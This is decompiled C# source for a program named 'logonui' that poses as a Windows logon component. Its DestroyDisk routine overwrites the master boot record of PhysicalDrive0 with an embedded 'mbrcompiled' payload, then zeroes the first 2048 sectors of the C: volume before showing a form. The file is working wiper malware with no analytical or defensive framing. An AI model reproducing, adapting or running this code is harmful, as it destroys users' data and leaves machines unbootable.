using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using logonui.Properties;

namespace logonui
{
	// Token: 0x02000003 RID: 3
	internal static class Program
	{
		// Token: 0x06000008 RID: 8
		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		private static extern IntPtr CreateFile(string filename, Program.EFileAccess access, Program.EFileShare share, IntPtr securityAttributes, Program.ECreationDisposition creationDisposition, Program.EFileAttributes flagsAndAttributes, IntPtr templateFile);

		// Token: 0x06000009 RID: 9
		[DllImport("kernel32.dll")]
		private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, [In] IntPtr lpOverlapped);

		// Token: 0x0600000A RID: 10
		[DllImport("kernel32.dll")]
		private static extern bool CloseHandle(IntPtr hObject);

		// Token: 0x0600000B RID: 11 RVA: 0x00002454 File Offset: 0x00000654
		[STAThread]
		private static void Main()
		{
			if (Process.GetProcessesByName("LogonUI").Length < 2 && Process.GetProcessesByName("explorer").Length < 1)
			{
				Program.DestroyDisk();
				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(false);
				Application.Run(new MainForm());
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002490 File Offset: 0x00000690
		private static void DestroyDisk()
		{
			IntPtr intPtr = Program.CreateFile("\\\\.\\PhysicalDrive0", (Program.EFileAccess)3221225472U, Program.EFileShare.Read | Program.EFileShare.Write, IntPtr.Zero, Program.ECreationDisposition.OpenExisting, (Program.EFileAttributes)0U, IntPtr.Zero);
			uint num;
			Program.WriteFile(intPtr, Resources.mbrcompiled, (uint)Resources.mbrcompiled.Length, out num, IntPtr.Zero);
			for (int i = 0; i < 2047; i++)
			{
				Program.WriteFile(intPtr, Resources.mbrcompiled, (uint)Program.sector.Length, out num, IntPtr.Zero);
			}
			Program.CloseHandle(intPtr);
			IntPtr intPtr2 = Program.CreateFile("\\\\.\\C:", (Program.EFileAccess)3221225472U, Program.EFileShare.Read | Program.EFileShare.Write, IntPtr.Zero, Program.ECreationDisposition.OpenExisting, (Program.EFileAttributes)0U, IntPtr.Zero);
			for (int j = 0; j < 2048; j++)
			{
				Program.WriteFile(intPtr2, Program.sector, (uint)Program.sector.Length, out num, IntPtr.Zero);
			}
			Program.CloseHandle(intPtr2);
		}

		// Token: 0x04000009 RID: 9
		private static byte[] sector = new byte[512];

		// Token: 0x0200000C RID: 12
		[Flags]
		private enum EFileAccess : uint
		{
			// Token: 0x04000022 RID: 34
			AccessSystemSecurity = 16777216U,
			// Token: 0x04000023 RID: 35
			MaximumAllowed = 33554432U,
			// Token: 0x04000024 RID: 36
			Delete = 65536U,
			// Token: 0x04000025 RID: 37
			ReadControl = 131072U,
			// Token: 0x04000026 RID: 38
			WriteDAC = 262144U,
			// Token: 0x04000027 RID: 39
			WriteOwner = 524288U,
			// Token: 0x04000028 RID: 40
			Synchronize = 1048576U,
			// Token: 0x04000029 RID: 41
			StandardRightsRequired = 983040U,
			// Token: 0x0400002A RID: 42
			StandardRightsRead = 131072U,
			// Token: 0x0400002B RID: 43
			StandardRightsWrite = 131072U,
			// Token: 0x0400002C RID: 44
			StandardRightsExecute = 131072U,
			// Token: 0x0400002D RID: 45
			StandardRightsAll = 2031616U,
			// Token: 0x0400002E RID: 46
			SpecificRightsAll = 65535U,
			// Token: 0x0400002F RID: 47
			FILE_READ_DATA = 1U,
			// Token: 0x04000030 RID: 48
			FILE_LIST_DIRECTORY = 1U,
			// Token: 0x04000031 RID: 49
			FILE_WRITE_DATA = 2U,
			// Token: 0x04000032 RID: 50
			FILE_ADD_FILE = 2U,
			// Token: 0x04000033 RID: 51
			FILE_APPEND_DATA = 4U,
			// Token: 0x04000034 RID: 52
			FILE_ADD_SUBDIRECTORY = 4U,
			// Token: 0x04000035 RID: 53
			FILE_CREATE_PIPE_INSTANCE = 4U,
			// Token: 0x04000036 RID: 54
			FILE_READ_EA = 8U,
			// Token: 0x04000037 RID: 55
			FILE_WRITE_EA = 16U,
			// Token: 0x04000038 RID: 56
			FILE_EXECUTE = 32U,
			// Token: 0x04000039 RID: 57
			FILE_TRAVERSE = 32U,
			// Token: 0x0400003A RID: 58
			FILE_DELETE_CHILD = 64U,
			// Token: 0x0400003B RID: 59
			FILE_READ_ATTRIBUTES = 128U,
			// Token: 0x0400003C RID: 60
			FILE_WRITE_ATTRIBUTES = 256U,
			// Token: 0x0400003D RID: 61
			GenericRead = 2147483648U,
			// Token: 0x0400003E RID: 62
			GenericWrite = 1073741824U,
			// Token: 0x0400003F RID: 63
			GenericExecute = 536870912U,
			// Token: 0x04000040 RID: 64
			GenericAll = 268435456U,
			// Token: 0x04000041 RID: 65
			SPECIFIC_RIGHTS_ALL = 65535U,
			// Token: 0x04000042 RID: 66
			FILE_ALL_ACCESS = 2032127U,
			// Token: 0x04000043 RID: 67
			FILE_GENERIC_READ = 1179785U,
			// Token: 0x04000044 RID: 68
			FILE_GENERIC_WRITE = 1179926U,
			// Token: 0x04000045 RID: 69
			FILE_GENERIC_EXECUTE = 1179808U
		}

		// Token: 0x0200000D RID: 13
		[Flags]
		public enum EFileShare : uint
		{
			// Token: 0x04000047 RID: 71
			None = 0U,
			// Token: 0x04000048 RID: 72
			Read = 1U,
			// Token: 0x04000049 RID: 73
			Write = 2U,
			// Token: 0x0400004A RID: 74
			Delete = 4U
		}

		// Token: 0x0200000E RID: 14
		public enum ECreationDisposition : uint
		{
			// Token: 0x0400004C RID: 76
			New = 1U,
			// Token: 0x0400004D RID: 77
			CreateAlways,
			// Token: 0x0400004E RID: 78
			OpenExisting,
			// Token: 0x0400004F RID: 79
			OpenAlways,
			// Token: 0x04000050 RID: 80
			TruncateExisting
		}

		// Token: 0x0200000F RID: 15
		[Flags]
		public enum EFileAttributes : uint
		{
			// Token: 0x04000052 RID: 82
			Readonly = 1U,
			// Token: 0x04000053 RID: 83
			Hidden = 2U,
			// Token: 0x04000054 RID: 84
			System = 4U,
			// Token: 0x04000055 RID: 85
			Directory = 16U,
			// Token: 0x04000056 RID: 86
			Archive = 32U,
			// Token: 0x04000057 RID: 87
			Device = 64U,
			// Token: 0x04000058 RID: 88
			Normal = 128U,
			// Token: 0x04000059 RID: 89
			Temporary = 256U,
			// Token: 0x0400005A RID: 90
			SparseFile = 512U,
			// Token: 0x0400005B RID: 91
			ReparsePoint = 1024U,
			// Token: 0x0400005C RID: 92
			Compressed = 2048U,
			// Token: 0x0400005D RID: 93
			Offline = 4096U,
			// Token: 0x0400005E RID: 94
			NotContentIndexed = 8192U,
			// Token: 0x0400005F RID: 95
			Encrypted = 16384U,
			// Token: 0x04000060 RID: 96
			Write_Through = 2147483648U,
			// Token: 0x04000061 RID: 97
			Overlapped = 1073741824U,
			// Token: 0x04000062 RID: 98
			NoBuffering = 536870912U,
			// Token: 0x04000063 RID: 99
			RandomAccess = 268435456U,
			// Token: 0x04000064 RID: 100
			SequentialScan = 134217728U,
			// Token: 0x04000065 RID: 101
			DeleteOnClose = 67108864U,
			// Token: 0x04000066 RID: 102
			BackupSemantics = 33554432U,
			// Token: 0x04000067 RID: 103
			PosixSemantics = 16777216U,
			// Token: 0x04000068 RID: 104
			OpenReparsePoint = 2097152U,
			// Token: 0x04000069 RID: 105
			OpenNoRecall = 1048576U,
			// Token: 0x0400006A RID: 106
			FirstPipeInstance = 524288U
		}
	}
}
